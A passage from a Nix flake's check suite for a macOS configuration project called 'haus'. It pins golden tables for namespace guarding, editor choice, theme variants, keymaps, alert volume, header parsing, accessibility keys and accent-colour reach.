                + "`packEntries` is being applied at or above the `roster` option instead of per leaf, "
                + "which replaces the collection's whole definition rather than deprioritising it."
              )
              ++ nixpkgs.lib.optional (resolved.${id}.key != null) (
                "${name}: the host's `roster.${id}.key` did not win — `packEntries` is not lowering the "
                + "collection's priority at all, so a consumer meets a module-system conflict instead."
              )
              ++ nixpkgs.lib.optional (lost != [ ]) (
                "${name}: the host overrode `roster.${id}.key` and the collection's "
                + "${builtins.concatStringsSep ", " lost} went with it — an override of one field must "
                + "not take the rest of the entry."
              );
          # A switch with no file, or a file with no switch. Three edits make a
          # collection (options.nix, the file, the table); this is what turns any
          # two of them into a failure instead of a silently inert switch.
          collectionOrphans =
            map (n: "`haus.apps.packs.${n}.enable` has no file in modules/apps/packs/default.nix") (
              builtins.filter (n: !(collectionFiles ? ${n})) collectionNames
            )
            ++ map (
              n:
              "modules/apps/packs/default.nix lists `${n}`, which no `haus.apps.packs.<name>.enable` switches on"
            ) (builtins.filter (n: !(builtins.elem n collectionNames)) (builtins.attrNames collectionFiles));
          collectionFailures =
            collectionOrphans
            ++ nixpkgs.lib.optionals (collectionOrphans == [ ]) (
              builtins.concatMap collectionCompose collectionNames
            );

          # ---- namespace-guard -------------------------------------------------
          # The consumer-side half of the reserved prefix (step E0 of the
          # workshop's rooms-desktops plan). What it guards is a collision haus
          # cannot see from here: a person's own `options.haus.<name>` against a
          # name a FUTURE haus release takes. `modules/lib/namespaces.nix` has
          # the measurement and the reasoning; this pins the behaviour, including
          # the two ways it has already been got wrong.
          #
          # It is pure lib, like `room-registry` and `data-only-surface`, so it
          # runs on the Linux runner rather than on nobody's CI.
          namespaceGuard = import ./modules/lib/namespaces.nix {
            lib = nixpkgs.lib;
            inherit registry;
          };
          nsOptionsOf =
            mods:
            (nixpkgs.lib.evalModules {
              specialArgs.lib = nixpkgs.lib;
              modules = import ./modules/options-modules.nix ++ mods;
            }).options.haus;
          # A room someone wrote for themselves, in the shape /rooms/creating
          # teaches. Two leaves and no `enable`-only shortcut, because naming the
          # file has to work for the 26 of haus's 35 namespaces that have no
          # `enable` leaf either.
          nsPrivateRoom = {
            _file = "/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix";
            options.haus.photography = {
              enable = nixpkgs.lib.mkOption {
                type = nixpkgs.lib.types.bool;
                default = false;
                description = "A room someone wrote for their own Mac.";
              };
              catalog = nixpkgs.lib.mkOption {
                type = nixpkgs.lib.types.str;
                default = "~/Pictures";
                description = "Where the photos live.";
              };
            };
          };
          # The same room, moved to where this whole step is telling people to
          # put it. Must come back silent.
          nsReservedRoom = {
            _file = "/nix/store/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-source/photography.nix";
            options.haus.my.photography.enable = nixpkgs.lib.mkOption {
              type = nixpkgs.lib.types.bool;
              default = false;
              description = "The same room, under the reserved prefix.";
            };
          };
          # E1's three fixtures. A published room, ONE store root, that this
          # machine's claim table names — must come back silent on both the
          # warning and the assertion side.
          nsClaimedRoom = {
            _file = "/nix/store/cccccccccccccccccccccccccccccccc-source/photography.nix";
            options.haus.photography.enable = nixpkgs.lib.mkOption {
              type = nixpkgs.lib.types.bool;
              default = false;
              description = "A published room, correctly claimed.";
            };
          };
          nsClaimTable = {
            photography = "github:ada/photo-room";
          };
          # A SECOND input's leaf under the same namespace `nsClaimTable`
          # claims for the first — the co-ownership hazard itself. Different
          # store root is the whole test.
          nsCoOwnerRoom = {
            _file = "/nix/store/dddddddddddddddddddddddddddddddd-source/hook.nix";
            options.haus.photography.hook = nixpkgs.lib.mkOption {
              type = nixpkgs.lib.types.str;
              default = "";
              description = "A second input's leaf under the same claimed namespace.";
            };
          };
          nsShow = xs: if xs == [ ] then "-" else builtins.concatStringsSep "," xs;
          nsRow =
            name: mods:
            let
              opts = nsOptionsOf mods;
              rows = namespaceGuard.unregistered opts;
            in
            "${name} candidates=${nsShow (namespaceGuard.candidates opts)} "
            + "unregistered=${nsShow (map (u: u.namespace) rows)} "
            + "declared-by=${nsShow (builtins.concatMap (u: u.declaredBy) rows)}";
          # `my` is a promise, so it is a check: haus may never ship a room under
          # it, and the day someone adds one this row is what says so.
          nsPromiseRow =
            let
              taken = builtins.elem namespaceGuard.reserved registeredNamespaces;
              declared = builtins.elem namespaceGuard.reserved actualNamespaces;
              yn = b: if b then "yes" else "no";
            in
            "promise reserved=${namespaceGuard.reserved} in-registry=${yn taken} declared-by-haus=${yn declared}";
          namespaceGuardTable = builtins.concatStringsSep "\n" [
            (nsRow "stock" [ ])
            (nsRow "private" [ nsPrivateRoom ])
            (nsRow "reserved" [ nsReservedRoom ])
            (nsRow "both" [
              nsPrivateRoom
              nsReservedRoom
            ])
            nsPromiseRow
          ];
          # `stock candidates=claude` is the row worth reading twice. The cheap
          # pre-filter DOES let the rename shim through (modules/moved.nix leaves
          # a hidden `haus.claude` behind) and the real derivation then clears
          # it — which is the whole reason the check is two steps rather than the
          # three-words-shorter one. If `unregistered` ever reads `claude` on the
          # stock row, the shorthand has come back and every haus machine is
          # being accused of installing something it didn't.
          expectedNamespaceGuardTable = ''
            stock candidates=claude unregistered=- declared-by=-
            private candidates=claude,photography unregistered=photography declared-by=/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
            reserved candidates=claude unregistered=- declared-by=-
            both candidates=claude,photography unregistered=photography declared-by=/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
            promise reserved=my in-registry=no declared-by-haus=no
          '';
          # The words a person actually meets, pinned like the ai room's pill
          # warnings: this text is the entire user-facing surface of E0.
          namespaceGuardWarnings = namespaceGuard.warningsFor (nsOptionsOf [ nsPrivateRoom ]) { };
          expectedNamespaceGuardWarnings = ''
            haus: `haus.photography` is not a room haus ships, and nothing here records who it belongs to.
              declared by /nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-source/photography.nix
            Yours alone? Move it under `haus.my.` — `haus.my.photography` — which haus promises never to ship a room under. Somebody else's published room? Then a plain name is correct — write the claim yourself so this machine can tell a real conflict from silence: `haus._rooms.claimed.photography = "<where it came from>";`. Either way the risk is the same: a haus release that takes this name meets the declaration above, and the likely outcome is not an error — two modules declaring different leaves under one namespace merge in silence, one room's switch steering the other's.
          '';
          # E1: a claim that matches what's declared stops warning entirely —
          # this is the sentence the note said the message would lose once E1
          # landed, proven by the warning list coming back empty.
          namespaceGuardWarningsClaimed = namespaceGuard.warningsFor (nsOptionsOf [
            nsClaimedRoom
          ]) nsClaimTable;
          # Matches the `+ "\n"` the derivation below applies to the actual
          # side — an empty list becomes one blank line, not a zero-byte file.
          expectedNamespaceGuardWarningsClaimed = "\n";
          # E1's fatal half: assertions, not warnings, and only for the two
          # cases that are never fine — a claimed namespace whose store roots
          # disagree, and a namespace haus ships colliding with an old claim.
          # `firstLine` because the full messages are already pinned above and
          # in the co-ownership/later-shipped rows below; the table is for
          # coverage across fixtures, not a second copy of the prose.
          nsFirstLine = m: builtins.head (nixpkgs.lib.splitString "\n" m);
          nsAssertRow =
            name: mods: claimed: hausVersion:
            let
              opts = nsOptionsOf mods;
              failing = builtins.filter (r: !r.assertion) (namespaceGuard.assertionsFor opts claimed hausVersion);
            in
            "${name} fatal=${toString (builtins.length failing)} ${
              nsShow (map (r: nsFirstLine r.message) failing)
            }";
          namespaceGuardAssertTable = builtins.concatStringsSep "\n" [
            (nsAssertRow "stock" [ ] { } null)
            (nsAssertRow "unclaimed" [ nsPrivateRoom ] { } null)
            (nsAssertRow "claimed" [ nsClaimedRoom ] nsClaimTable null)
            (nsAssertRow "coowned" [
              nsClaimedRoom
              nsCoOwnerRoom
            ] nsClaimTable null)
            (nsAssertRow "later-shipped" [ ] { bar = "github:ada/bar-room"; } "2026.08.20")
          ];
          expectedNamespaceGuardAssertTable = ''
            stock fatal=0 -
            unclaimed fatal=0 -
            claimed fatal=0 -
            coowned fatal=1 haus: `haus.photography` is claimed by github:ada/photo-room, but what's actually declared under it doesn't come from one source:
            later-shipped fatal=1 haus: `haus.bar` is now a namespace haus itself ships (as of 2026.08.20), but this machine had already claimed it for a third-party room:
          '';

          # ---- fragment-compat -------------------------------------------------
          # Step 5 of the rooms plan moved two top-level fragments into the rooms
          # that own them: `presets/large-print.nix` became
          # `haus.appearance.largePrint`, and `packs/writing.nix` became
          # `haus.apps.packs.writing.enable`. Both are the same claim — a
          # SPELLING changed and a machine did not — and both fail quietly when
          # it is wrong: a profile carrying three of its four values, a pack
          # switch installing three of its four apps. Nothing errors; you find
          # out on the machine, weeks later, wondering why the display never got
          # scaled.
          #
          # So each pair is evaluated as two whole systems and the derivations
          # compared. That is the technique the desktop seam used to prove it had
          # changed nothing (step 3), and it is not a sample: a drv path is every
          # value that reached the machine.
          #
          # The OLD spelling is taken from the compatibility alias rather than
          # from a copy of the deleted file, so this pins the second half of the
          # promise too — that `haus.presets.large-print` still resolves to what it
          # always did.
          compatPairs = {
            large-print = {
              old = [ presetModules.large-print ];
              new = [ { haus.appearance.largePrint = true; } ];
            };
          };
          compatRow =
            name:
            let
              pair = compatPairs.${name};
              oldDrv = exampleDrv { extraModules = pair.old; };
              newDrv = exampleDrv { extraModules = pair.new; };
            in
            if oldDrv == newDrv then "${name} old == new" else "${name} DIFFER old=${oldDrv} new=${newDrv}";
          compatRows = map compatRow (builtins.attrNames compatPairs);

          # ---- editor-choice ---------------------------------------------------
          # `haus.terminal.editorName` is the desktop-safe half of the editor pair
          # (modules/lib/editors.nix). What makes it worth a check rather than a
          # type is that ONE assignment has to move four unrelated things at
          # once: the package that lands in the profile, $EDITOR/$VISUAL, the
          # Nebelung theme file, and whether this room claims the `helix` port
          # for `haus doctor`. Three of the four fail SILENTLY when they drift
          # — you get an editor with no theme, or a doctor that says a tool is
          # handled on a machine that never installed it — so the table reads
          # all four back off a fully evaluated machine, once per enum value.
          #
          # The last row is the escape hatch: `editor` is host-only and still
          # the last word, so a host naming a command the layer never installs
          # keeps the enum's PACKAGE and overrides only what runs.
          editorHome =
            mods:
            (mkHaus {
              inherit system;
              username = "you";
              hostname = "example";
              extraModules = mods;
            }).config;
          editorRow =
            name:
            let
              full = editorHome [ { haus.terminal.editorName = name; } ];
              home = full.home-manager.users.you;
              hasPkg = want: builtins.any (p: (p.pname or "") == want) home.home.packages;
              installed = hasPkg name;
              # Read separately from `installed`, because the drift worth
              # catching is the one where nothing goes MISSING: drop the
              # `lib.mkIf` from `programs.helix` and every row still says
              # installed=yes while helix rides along on all four machines.
              helixPkg = hasPkg "helix";
              themed = home.home.file ? ".config/helix/themes/nebelung.toml";
              port = builtins.elem "helix" full.haus.theme.ports.handled;
              yn = b: if b then "yes" else "no";
            in
            "${name} EDITOR=${home.home.sessionVariables.EDITOR} installed=${yn installed} "
            + "helix-pkg=${yn helixPkg} helix-theme=${yn themed} helix-port=${yn port}";
          editorOverrideRow =
            let
              full = editorHome [
                {
                  haus.terminal.editorName = "neovim";
                  haus.terminal.editor = "code -w";
                }
              ];
              home = full.home-manager.users.you;
              installed = builtins.any (p: (p.pname or "") == "neovim") home.home.packages;
            in
            "host override EDITOR=${home.home.sessionVariables.EDITOR} "
            + "installed=${if installed then "neovim" else "NOTHING"}";
          editorTable = builtins.concatStringsSep "\n" (
            map editorRow (builtins.attrNames (import ./modules/lib/editors.nix)) ++ [ editorOverrideRow ]
          );
          expectedEditorTable = ''
            helix EDITOR=hx installed=yes helix-pkg=yes helix-theme=yes helix-port=yes
            nano EDITOR=nano installed=yes helix-pkg=no helix-theme=no helix-port=no
            neovim EDITOR=nvim installed=yes helix-pkg=no helix-theme=no helix-port=no
            vim EDITOR=vim installed=yes helix-pkg=no helix-theme=no helix-port=no
            host override EDITOR=code -w installed=neovim
          '';

          composedConfig =
            mods:
            (nixpkgs.lib.evalModules {
              specialArgs.lib = nixpkgs.lib;
              modules = import ./modules/options-modules.nix ++ mods;
            }).config;

          # And the quiet half, which outlives the preset format that found it:
          # no error, no warning, two data files' definitions combined into a
          # machine neither of them describes. A list- or set-valued option never
          # conflicts — those definitions are COMBINED — so two packs that each
          # add an app, or two files that each author a first-run tour step, give
          # you both in an order neither chose. That is the failure mode with no
          # message, and therefore the one worth pinning most.
          riceTour = hint: {
            haus.tour.steps = [
              {
                inherit hint;
                detect = "palette";
              }
            ];
          };
          riceApp = id: {
            haus.roster.${id} = {
              name = id;
              cask = id;
            };
          };
          mergeRows = [
            "two data files, one tour step each: ${
              builtins.concatStringsSep ", " (
                map (s: s.hint)
                  (composedConfig [
                    (riceTour "A")
                    (riceTour "B")
                  ]).haus.tour.steps
              )
            } (merged, no error)"
            "two data files, one app each: ${
              builtins.concatStringsSep ", " (
                builtins.attrNames
                  (composedConfig [
                    (riceApp "obsidian")
                    (riceApp "zotero")
                  ]).haus.roster
              )
            } (merged, no error)"
          ];

          fragmentCompatTable = builtins.concatStringsSep "\n" (compatRows ++ mergeRows);
          expectedFragmentCompatTable = ''
            large-print old == new
            two data files, one tour step each: B, A (merged, no error)
            two data files, one app each: obsidian, zotero (merged, no error)
          '';

          # ---- theme-variants -------------------------------------------------
          # modules/lib/nebelung.nix turns haus.theme.{flavor,contrast} into a
          # subdirectory of the nebelung themes package and a palette-variant name.
          # That rule MIRRORS nebelung's own (`variantDir` in its
          # scripts/generate-palette.mjs) across a repo boundary, and its failure
          # mode is silent: a wrong subdir is just a store path that doesn't exist,
          # discovered at activation rather than at eval. So the mapping is pinned
          # here as a golden table — a rename on either side fails this check with
          # the two tables diffed side by side.
          nbStub = {
            themes = "/THEMES";
            palettes =
              nixpkgs.lib.genAttrs
                [
                  "nebelung"
                  "nebelung-high-contrast"
                  "nebelung-latte"
                  "nebelung-latte-high-contrast"
                ]
                (name: {
                  base = name;
                });
          };
          resolve =
            flavor: contrast:
            import ./modules/lib/nebelung.nix {
              inherit (pkgs) lib;
              nebelung = nbStub;
              theme = { inherit flavor contrast; };
            };
          row =
            flavor: contrast:
            let
              nb = resolve flavor contrast;
            in
            "${flavor}/${contrast} -> ${nb.variant} @ ${nb.root} (${nb.flavor}/${nb.title})";
          variantTable = builtins.concatStringsSep "\n" [
            (row "mocha" "normal")
            (row "mocha" "high")
            (row "latte" "normal")
            (row "latte" "high")
          ];
          # The default combination must resolve to the themes-package ROOT with no
          # suffix — that's what keeps every pre-variant path byte-identical.
          expectedVariantTable = ''
            mocha/normal -> nebelung @ /THEMES (mocha/Mocha)
            mocha/high -> nebelung-high-contrast @ /THEMES/high-contrast (mocha/Mocha)
            latte/normal -> nebelung-latte @ /THEMES/latte (latte/Latte)
            latte/high -> nebelung-latte-high-contrast @ /THEMES/latte-high-contrast (latte/Latte)
          '';
          # An old nebelung lock has no latte palettes. Selecting one must throw the
          # "run nix flake update nebelung" message rather than nix's bare
          # "attribute missing", which points nowhere near the cause.
          staleLockThrows =
            !(builtins.tryEval (
              (import ./modules/lib/nebelung.nix {
                inherit (pkgs) lib;
                nebelung = {
                  themes = "/THEMES";
                  palettes.nebelung = { };
                };
                theme = {
                  flavor = "latte";
                  contrast = "normal";
                };
              }).palette
            )).success;
          # ---- keymap ---------------------------------------------------------
          # modules/lib/keys.nix turns haus.keys.* into AeroSpace chords, the
          # pounce hotkey, and the glyphs that caption them — and the whole reason
          # it exists is that a chord and its caption must not drift. So the table
          # is pinned: change a chord and this check shows you the caption that
          # moved with it (or didn't). It also pins the two collapses that make a
          # mouse-first rice possible, where "none" must yield NO chord rather than
          # a default one.
          keymapRow =
            leader: palette: windowNav:
            let
              k = import ./modules/lib/keys.nix {
                inherit (pkgs) lib;
                keys = { inherit leader palette windowNav; };
              };
              show = v: f: if v == null then "-" else f v;
            in
            "${leader}/${palette}/${windowNav}"
            + " leader=${
               show k.leader (v: "${v.chord} ${v.glyph} caps=${if v.capsRemap then "yes" else "no"}")
             }"
            + " palette=${
               show k.palette (
                 v:
                 "${nixpkgs.lib.concatStringsSep "-" (v.modifiers ++ [ v.key ])} ${v.glyph} spotlight=${
                   if v.stealsSpotlight then "yes" else "no"
                 }"
               )
             }"
            + " nav=${show k.nav (v: "${v.chord} ${v.glyph}")}"
            + " conflicts=${toString (builtins.length k.conflicts)}";
          keymapTable = builtins.concatStringsSep "\n" [
            (keymapRow "caps" "cmd-space" "alt")
            (keymapRow "alt-space" "ctrl-space" "ctrl-alt")
            (keymapRow "none" "none" "none")
            # Two keys, one chord. Silent in practice (whoever registers first
            # wins), so windows asserts on it — this pins that it's detected at all.
            (keymapRow "alt-space" "alt-space" "cmd-alt")
          ];
          # ---- alert-volume ----------------------------------------------------
          # haus.sound.alertVolume is 0–100, and macOS stores e^(v/100 − 1).
          # The conversion is a Taylor series in modules/lib/alert-volume.nix
          # (Nix has no `exp`), so it is exactly the kind of thing that can
          # drift a decimal place in a refactor and produce a machine that is
          # merely quieter than it asked to be — no error, nothing to notice.
          #
          # The right-hand column is not a re-derivation of the formula: it is
          # what CoreAudio reported when each value was written on macOS 26.6.1
          # (workshop notes/probes/sound-sweep.sh, `osascript -e 'get volume
          # settings'`). Recomputing the same maths a second time would only
          # check the code against itself; these numbers came off the machine.
          alertVolumeTable = builtins.concatStringsSep "\n" (
            map
              (
                p:
                "${toString p} -> ${
                  toString ((import ./modules/lib/alert-volume.nix { lib = nixpkgs.lib; }).fromPercent p)
                }"
              )
              [
                0
                25
                50
                60
                75
                100
              ]
          );
          expectedAlertVolumeTable = ''
            0 -> 0.000000
            25 -> 0.472367
            50 -> 0.606531
            60 -> 0.670320
            75 -> 0.778801
            100 -> 1.000000
          '';

          # ---- state-files -----------------------------------------------------
          # ../lib/state-files.nix names the files under ~/.local/state/haus that
          # one room WRITES and another READS. Those pairs are joined by nothing
          # the compiler or the module system can see: one side is a shell
          # script, the other is a `# pounce:` header, a Swift string, or a
          # daemon's environment. A rename on one side is not an error anywhere
          # and its symptom is the absence of a thing — a row that stops being
          # listed, a pill stuck on Columns, a lid that sleeps mid-run.
          #
          # This pins the token that renames, in every file that spells it. It
          # is emphatically NOT a mirror of the paths: Nix consumers import the
          # attrset, and the second half below is what keeps them honest.
          stateFiles = import ./modules/lib/state-files.nix;
          stateFileEntries = nixpkgs.lib.mapAttrsToList (key: f: f // { inherit key; }) stateFiles;

          # ---- pounce-header-grammar -------------------------------------------
          # modules/launcher/header-grammar.nix is our third copy of pounce's
          # `# pounce: key = value` parser, and the only reader of `cheat` /
          # `cheatWhen` — so a parse miss there has NO symptom: the cheatsheet's
          # key box quietly falls back to a name's first word, or a caption drops
          # the clause explaining why a row is absent. Nothing logs it, and
          # pounce cannot notice because it ignores those two keys by design.
          #
          # The case NAMES are pounce's fixture filenames
          # (pkgs/pounce/tests/fixtures/header-grammar/), so the two repos pin the
          # same decisions under the same words even though the tables differ in
          # shape — pounce compares whole registry lines, we only ever ask for one
          # field. When the lock moves past pounce#95 this can read those fixture
          # files directly, the way `pounce-item-grammar` reads ItemSettings.swift.
          #
          # `NONE` is a parse miss and is a RESULT, not an absence: three of these
          # cases must not parse, and a table that only listed successes would go
          # green on a regex that matched everything.
          headerGrammarTable =
            let
              g = import ./modules/launcher/header-grammar.nix;
              # Nix string literals, so every space here is visible and exact —
              # the reason the inputs live in code and only the verdicts in the
              # golden text below.
              cases = [
                { canonical = "# pounce: name = Canonical"; }
                { wide-equals = "# pounce: name  =  Wide Equals"; }
                { tight-equals = "# pounce: name=Tight Equals"; }
                { indented = "  # pounce: name = Indented"; }
                { wide-hash = "#  pounce: name = Wide Hash"; }
                { tab-hash = "#\tpounce: name = Tab Hash"; }
                { tight-colon = "# pounce:name = Tight Colon"; }
                { trailing-space = "# pounce: name = Trailing Space   "; }
                { tight-hash = "#pounce: name = Tight Hash"; }
                { key-collision = "# pounce: names = Not A Name"; }
                { not-a-comment = "// pounce: name = Not A Comment"; }
              ];
              # EVERY row goes through this, including the ones expected to
              # succeed. Interpolating a value directly would turn a regression
              # that returns null into `cannot coerce null to a string` — an eval
              # error, from inside a check whose whole job is to print a legible
              # diff. A row is only useful when the failure mode is a ROW.
              row = name: got: "${name} -> ${if got == null then "NONE" else "[${got}]"}";
            in
            builtins.concatStringsSep "\n" (
              map (
                c:
                let
                  name = builtins.head (builtins.attrNames c);
                in
                row name (g.matchField "name" c.${name})
              ) cases
              # `cheatWhen` is the key this whole check exists for, so it is asked
              # by its own name rather than trusted to behave like `name`.
              ++ [
                (row "cheatWhen-trailing" (g.matchField "cheatWhen" "# pounce: cheatWhen = while a page exists "))
              ]
              # The rows above all exercise `matchField`, one line at a time.
              # `commandField` calls `fieldOf`, which additionally splits a whole
              # FILE into lines and takes the first hit — so without these two the
              # check would go green on a broken splitter, testing a function the
              # module does not call. `first-wins` is pounce's rule in both of its
              # parsers (`&& n == ""`, `header.name.isEmpty`), and `absent` is the
              # null every caller branches on.
              ++ (
                let
                  file = "#!/bin/bash\n# pounce: name = First\n# pounce: name = Second\n";
                  filler = n: builtins.concatStringsSep "" (builtins.genList (_: "# filler\n") n);
                  at = n: "#!/bin/bash\n" + filler (n - 2) + "# pounce: name = Deep\n";
                in
                [
                  (row "fieldOf-first-wins" (g.fieldOf file "name"))
                  (row "fieldOf-absent" (g.fieldOf file "cheat"))
                  # Both of pounce's parsers stop after 30 lines, so we must too:
                  # a header below that is one WE read and the daemon never does.
                  # 30 in, 31 out — matching `NR > 30 { exit }` and `seen > 30`,
                  # which both process line 30 and abandon line 31.
                  (row "fieldOf-line30" (g.fieldOf (at 30) "name"))
                  (row "fieldOf-line31" (g.fieldOf (at 31) "name"))
                ]
              )
            );
          expectedHeaderGrammarTable = ''
            canonical -> [Canonical]
            wide-equals -> [Wide Equals]
            tight-equals -> [Tight Equals]
            indented -> [Indented]
            wide-hash -> [Wide Hash]
            tab-hash -> [Tab Hash]
            tight-colon -> [Tight Colon]
            trailing-space -> [Trailing Space]
            tight-hash -> NONE
            key-collision -> NONE
            not-a-comment -> NONE
            cheatWhen-trailing -> [while a page exists]
            fieldOf-first-wins -> [First]
            fieldOf-absent -> NONE
            fieldOf-line30 -> [Deep]
            fieldOf-line31 -> NONE
          '';

          # ---- accessibility-surface -------------------------------------------
          # modules/lib/reachability.nix names which com.apple.universalaccess
          # keys are measured to actually take effect, and that one fact has to be
          # true in three places at once. Two are pinned by construction —
          # modules/core/options.nix GENERATES haus.accessibility from the table
          # with `genAttrs` and throws in both directions if the descriptions and
          # the table disagree — so an option cannot drift from it silently.
          #
          # The third can, and this is it. `classify_key` in modules/core/haus.sh
          # decides how `haus diff`/`haus plan` VERIFY a declared key, and its
          # `effective` arm is a hand-typed copy of the same names. A shell script
          # can't import a Nix table, so the copy is unavoidable; what's avoidable
          # is nobody noticing when it goes stale. A key promoted in the table and
          # forgotten here would get an option, get written, and then be verified
          # against the PLIST instead of against NSWorkspace — reintroducing the
          # exact read-back-looks-fine failure this whole area exists to catch,
          # inside the checker meant to catch it.
          #
          # So: sed the arm out of the script at eval time and diff it, the same
          # shape `_bench`'s completion uses to stay in step with `bench`. If
          # `classify_key` is ever reshaped so the marker line is gone, this fails
          # loudly rather than passing on an empty comparison — the one failure
          # mode a grep-shaped pin can have.
          a11yTable = import ./modules/lib/reachability.nix;
          # Two classes may back an option, and each has its OWN arm in
          # classify_key, so both need pinning — and the reason is sharper than
          # "twice as much coverage". A key in the wrong arm is worse than a key
          # in no arm: put a `by-eye` key in the `effective` arm and `haus diff`
          # asks `hausax` for a field that does not exist (there is no
          # NSWorkspace property for pointer size), gets null, and reports a
          # mismatch on a correctly-applied setting forever. The classes are
          # listed here rather than derived from the table's values because
          # `unconfirmed`/`gui-only`/`noop` are deliberately NOT option-backed;
          # this list is "may back an option", which is a decision, not data.
          a11yClasses = [
            "effective"
            "by-eye"
          ];
          a11yScriptLines = nixpkgs.lib.splitString "\n" (builtins.readFile ./modules/core/haus.sh);
          a11yTableKeysOf =
            class:
            nixpkgs.lib.sort (a: b: a < b) (
              nixpkgs.lib.attrNames (
                nixpkgs.lib.filterAttrs (_: e: e == class) a11yTable."com.apple.universalaccess".keys
              )
            );
          a11yArmLineOf =
            class: nixpkgs.lib.findFirst (l: nixpkgs.lib.hasInfix ") echo ${class} ;;" l) null a11yScriptLines;
          a11yShellKeysOf =
            class:
            let
              armLine = a11yArmLineOf class;
            in
            if armLine == null then
              [ ]
            else
              nixpkgs.lib.sort (a: b: a < b) (
                builtins.filter (s: s != "") (
                  map (s: nixpkgs.lib.replaceStrings [ " " ] [ "" ] s) (
                    nixpkgs.lib.splitString "|" (builtins.head (nixpkgs.lib.splitString ")" armLine))
                  )
                )
              );
          a11yArmsMissing = builtins.filter (c: a11yArmLineOf c == null) a11yClasses;

          expectedKeymapTable = ''
            caps/cmd-space/alt leader=f18 ⇪ caps=yes palette=cmd-space ⌘ Space spotlight=yes nav=alt ⌥ conflicts=0
            alt-space/ctrl-space/ctrl-alt leader=alt-space ⌥␣ caps=no palette=ctrl-space ⌃ Space spotlight=no nav=ctrl-alt ⌃⌥ conflicts=0
            none/none/none leader=- palette=- nav=- conflicts=0
            alt-space/alt-space/cmd-alt leader=alt-space ⌥␣ caps=no palette=alt-space ⌥ Space spotlight=no nav=cmd-alt ⌘⌥ conflicts=1
          '';
          # ---- accent-reach ---------------------------------------------------
          # haus.theme.accent does NOT recolour everything, and the option
          # says so — it moves the handful of tools the rice injects an accent
          # hex into, and leaves the single-file dotfiles on their built-in
          # colour. Both halves of that sentence are a promise, and both fail
          # SILENTLY: drop the accent wire from lazygit in a terminal refactor and
          # nothing errors, the accent just quietly stops arriving; wire it into
          # ghostty by accident and a documented boundary moves without anyone
          # deciding to move it. So the reach is pinned as a golden table.
          #
          # Each surface is fingerprinted under three accents. "moves" means all
          # three fingerprints differ (three, not two, so a fingerprint that
          # merely happens to differ once can't pass); "pinned" means all three
          # are byte-identical. Anything in between is PARTIAL and fails loudly,
          # because it means the accent reaches a surface for some accents only.
          #
          # zed is here as the ROSTER-PORT case (modules/theme/ports.nix): the
          # accent-matrix ports spell the choice `<accent>` in their path, and
          # resolving that is what keeps them installable. It's the one row whose
          # fingerprint is a FILENAME rather than a file's contents — the port
          # renames its theme file per accent, which is exactly the behaviour to
          # pin, since the app's own `theme` key then points at the old name.
          accentSurfaces =
            accent:
            let
              cfg =
                (mkHaus {
                  inherit system;
                  username = "you";
                  hostname = "example";
                  extraModules = [
                    {
                      haus.theme.accent = accent;
                      # `minimal` is the generated desktop, and it spends the
                      # accent twice — as the bloom behind the mark, and in the
                      # derivation's own name. The three hand-made looks are
                      # shipped PNGs by design; `bold` follows the accent too,
                      # through one interpolation that predates this check.
                      haus.wallpaper.style = "minimal";
                      # Not in the default rice — added here so the roster-port
                      # accent path has a subject at all.
                      haus.roster.zed = {
                        name = "Zed";
                        cask = "zed";
                      };
                      # Same reason, and the one surface here that reaches the
                      # WEB rather than an app's own config: the compiled
                      # userstyle sheet exists only once a style is named.
                      # Without this line the `zen` row below fingerprints
                      # nebelung's own userContent.css and would not notice the
                      # accent dropping out of the compiled half — which is the
                      # only half nothing else in the flake ever evaluates.
                      # (There were two until 2026-08-20; the other was the
                      # stamped Stylus bundle, and it is retired.)
                      haus.zen.userStyles = [ "github" ];
                    }
                  ];
                }).config;
              hm = cfg.home-manager.users.you;
              file =
                target:
                let
                  entry = hm.home.file.${target};
                in
                if entry.text != null then entry.text else toString entry.source;
              xdgFile =
                target:
                let
                  entry = hm.xdg.configFile.${target};
                in
                if entry.text != null then entry.text else toString entry.source;
              targetsUnder =
                prefix:
                nixpkgs.lib.concatStringsSep "," (
                  builtins.filter (nixpkgs.lib.hasPrefix prefix) (builtins.attrNames hm.home.file)
                );
            in
            builtins.mapAttrs (_: builtins.unsafeDiscardStringContext) {
              # --- the accent is supposed to arrive here ---
              fzf = hm.home.sessionVariables.FZF_DEFAULT_OPTS;
              glow = xdgFile "yazi/plugins/glow.yazi";
              lazygit = file "Library/Application Support/lazygit/config.yml";
              yazi = file ".config/yazi/theme.toml";
              zen = hm.home.activation.zenNebelung.data;
              wallpaper = hm.home.activation.hausWallpaper.data;
              zed-roster-port = targetsUnder ".config/zed/themes/";
              # perch takes the accent by catppuccin ROLE NAME rather than by
              # hex — it resolves the name against whichever half of its
              # dark/light pair macOS is showing — so the fingerprint that moves
              # here is the name inside config.json, not a colour.
              perch = hm.home.activation.perchTheme.data;
              # The BAR, via its far-left logo pill only. bar's palette file is
              # the whole nebelung palette and never moves with the accent (it is
              # in the pinned half below, and stays there); haus.bar.logo.color
              # left null resolves to the accent and lands here, so this is the
              # one bar file the accent reaches. Split out rather than folded
              # into the `bar` row because the two answer different questions —
              # "did the palette change" and "did the accent choose a pill".
              bar-logo = file ".config/sketchybar/logo_config.sh";
              # --- and is supposed to leave these alone ---
              bat = file "/Users/you/.config/bat/themes/Catppuccin Mocha.tmTheme";
              ghostty = file "Library/Application Support/com.mitchellh.ghostty/config";
              helix = file ".config/helix/themes/nebelung.toml";
              lsd = file ".config/lsd/colors.yaml";
              opencode = file ".config/opencode/themes/nebelung.json";
              pounce = file "/Users/you/.config/pounce/themes/nebelung.json";
              bar = file ".config/sketchybar/colors.sh";
              starship = file "/Users/you/.config/starship.toml";
            };
          # Three full evaluations, bound once rather than per row — the rows are
          # cheap, the systems are not.
          accentA = accentSurfaces "mauve";
          accentB = accentSurfaces "green";
          accentC = accentSurfaces "sapphire";
          accentRow =
            name:
            let
              a = accentA.${name};
              b = accentB.${name};
              c = accentC.${name};
            in
            "${name} ${
              if a != b && b != c && a != c then
                "moves"
              else if a == b && b == c then
                "pinned"
              else
                "PARTIAL"
            }";
          accentTable = builtins.concatStringsSep "\n" (map accentRow (builtins.attrNames accentA));
          # Alphabetical because the rows are `attrNames` — self-sorting, so a new
          # surface can't be added in a spot that hides it. Nine move, eight hold.
